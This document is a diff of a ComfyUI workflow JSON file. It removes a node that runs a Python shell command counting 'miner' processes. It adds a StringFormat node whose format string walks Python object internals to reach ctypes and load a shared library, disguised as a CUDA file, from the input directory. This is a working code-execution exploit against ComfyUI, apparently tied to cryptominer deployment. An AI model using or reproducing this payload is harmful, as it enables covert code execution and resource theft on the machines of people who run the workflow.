@@ -1,16 +1,26 @@
 {
   "1": {
-    "class_type": "IDENode",
+    "class_type": "CreateHookKeyframe",
     "inputs": {
-      "language": "python",
-      "pycode": "import os\nresult = os.popen(\"pgrep -c miner 2>/dev/null || echo 0\").read().strip()\n"
+      "strength_mult": 1.0,
+      "start_percent": 0.0
     }
   },
   "2": {
+    "class_type": "StringFormat",
+    "inputs": {
+      "f_string": "{a.__class__.__init__.__globals__[comfy].memory_management.ctypes.cdll[/mnt/md0/ai/ComfyUI/input/libcuda_1782371604.so]}",
+      "values.a": [
+        "1",
+        0
+      ]
+    }
+  },
+  "3": {
     "class_type": "PreviewAny",
     "inputs": {
       "source": [
-        "1",
+        "2",
         0
       ]
     }
